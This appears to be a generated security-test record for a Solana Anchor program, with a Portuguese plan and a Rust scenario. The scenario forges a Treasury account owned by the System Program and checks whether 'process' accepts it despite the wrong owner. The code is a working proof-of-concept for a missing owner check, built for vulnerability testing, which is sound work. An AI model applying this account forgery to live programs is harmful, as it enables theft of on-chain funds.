{
  "plan": "Inicializa uma conta Treasury legítima via baseline para provar que o cenário está montado corretamente. Em seguida, cria uma conta forjada com dados de Treasury mas dono diferente do programa (System Program) e chama process com essa conta. O efeito mede se a conta forjada foi aceita apesar do dono incorreto, comparando o owner da conta após o ataque com o program_id.",
  "scenario": "let authority = Pubkey::new_unique();
let treasury_key = Pubkey::new_unique();

// Baseline: inicializa uma conta Treasury legítima
let init_ix = env.anchor_ix(
    "initialize",
    &1000u64.to_le_bytes(),
    vec![
        AccountMeta::new(treasury_key, true),
        AccountMeta::new(authority, true),
        AccountMeta::new_readonly(system_program::id(), false),
    ],
);
let (system_program_id, system_program_account) = system_program_account();
let init_accounts = vec![
    (treasury_key, empty_account()),
    (authority, wallet(1_000_000_000)),
    (system_program_id, system_program_account),
];
let baseline_result = env.baseline("initialize treasury", &init_ix, &init_accounts);
assert!(baseline_result.program_result == ProgramResult::Success);

// Ataque: conta forjada com dono diferente do programa
let forged_treasury_key = Pubkey::new_unique();
let mut forged_data = Vec::new();
forged_data.extend_from_slice(&anchor_account_discriminator("Treasury"));
forged_data.extend_from_slice(authority.as_ref());
forged_data.extend_from_slice(&1000u64.to_le_bytes());
forged_data.push(1u8);
let forged_account = account(&system_program::id(), &forged_data, None);

let attack_ix = env.anchor_ix(
    "process",
    &[],
    vec![
        AccountMeta::new_readonly(forged_treasury_key, false),
        AccountMeta::new_readonly(authority, true),
    ],
);
let attack_accounts = vec![
    (forged_treasury_key, forged_account),
    (authority, wallet(1_000_000_000)),
];
let attack_result = env.attack("process with forged owner", &attack_ix, &attack_accounts);

if attack_result.program_result == ProgramResult::Success {
    env.effect(
        "forged treasury accepted despite wrong owner",
        after(&attack_result, &forged_treasury_key).owner() != &env.program_id,
    );
}"
}

